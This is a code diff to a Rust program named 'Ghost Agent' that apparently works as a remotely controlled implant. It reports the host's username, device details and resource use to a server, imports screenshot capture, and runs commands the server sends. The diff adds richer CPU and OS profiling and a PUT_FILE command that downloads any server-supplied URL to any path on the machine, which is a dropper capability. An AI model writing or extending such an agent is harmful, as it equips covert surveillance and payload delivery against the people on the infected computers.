@@ -4,7 +4,7 @@ use std::path::Path;
 use std::time::Duration;
 use tokio::time::sleep;
 use serde::{Deserialize, Serialize};
-use sysinfo::{System, SystemExt, DiskExt}; // Tambahkan DiskExt
+use sysinfo::{System, SystemExt, DiskExt, CpuExt}; // Tambahkan DiskExt & CpuExt
 use reqwest::Client;
 use screenshots::Screen;
 use uuid::Uuid;
@@ -31,7 +31,10 @@ struct HeartbeatPayload {
     device_name: String,
     ram_usage: u64, // in MB
     ram_total: u64, // in MB
+    cpu_usage: f32, // fraction 0.0-100.0
+    cpu_brand: String,
     platform: String,
+    os_type: String,
     user: String,
 }
 
@@ -62,7 +65,7 @@ struct FileEntry {
 
 #[tokio::main]
 async fn main() {
-    println!("👻 Ghost Agent v2.0 - Active...");
+    println!("👻 Ghost Agent v2.1 - Enhanced Status Active...");
 
     let mut config = load_or_create_config();
     println!("📱 Device ID: {}", config.device_id);
@@ -74,20 +77,24 @@ async fn main() {
     let hb_client = client.clone();
     
     tokio::spawn(async move {
-        // Inisialisasi System object sekali saja
         let mut sys = System::new_all();
         loop {
-            // Refresh specific data
             sys.refresh_memory();
+            sys.refresh_cpu();
             
-            // Fix: sysinfo 0.29 uses methods on the instance, need SystemExt trait
+            let cpu_brand = sys.global_cpu_info().brand().to_string();
+            let cpu_usage = sys.global_cpu_info().cpu_usage();
+            
             let payload = HeartbeatPayload {
                 action: "heartbeat".to_string(),
                 device_id: hb_config.device_id.clone(),
                 device_name: hb_config.device_name.clone(),
                 ram_usage: sys.used_memory() / 1024 / 1024,
                 ram_total: sys.total_memory() / 1024 / 1024,
+                cpu_usage,
+                cpu_brand,
                 platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
+                os_type: sys.distribution_id(),
                 user: whoami::username(),
             };
 
@@ -270,6 +277,46 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
                 }
             }
         },
+        "PUT_FILE" => {
+            // Args expected: { "url": "...", "dest": "..." }
+            if let Some(args_str) = cmd.args {
+                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&args_str) {
+                    let url = json["url"].as_str().unwrap_or_default();
+                    let dest = json["dest"].as_str().unwrap_or_default();
+                    
+                    if !url.is_empty() && !dest.is_empty() {
+                         match client.get(url).send().await {
+                             Ok(resp) => {
+                                 if resp.status().is_success() {
+                                     match resp.bytes().await {
+                                         Ok(bytes) => {
+                                             if bytes.is_empty() {
+                                                 status = "ERROR".to_string();
+                                                 response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
+                                             } else if let Err(e) = std::fs::write(dest, bytes) {
+                                                 status = "ERROR".to_string();
+                                                 response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
+                                             }
+                                         },
+                                         Err(e) => {
+                                             status = "ERROR".to_string();
+                                             response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
+                                         }
+                                     }
+                                 } else {
+                                     status = "ERROR".to_string();
+                                     response_data = Some(serde_json::json!({ "message": format!("Download failed (HTTP {}): The URL might have expired or is not a direct link.", resp.status()) }));
+                                 }
+                             },
+                             Err(e) => {
+                                 status = "ERROR".to_string();
+                                 response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
+                             }
+                         }
+                    }
+                }
+            }
+        }
         _ => {
             status = "ERROR".to_string();
             response_data = Some(serde_json::json!({ "message": "Unknown command" }));
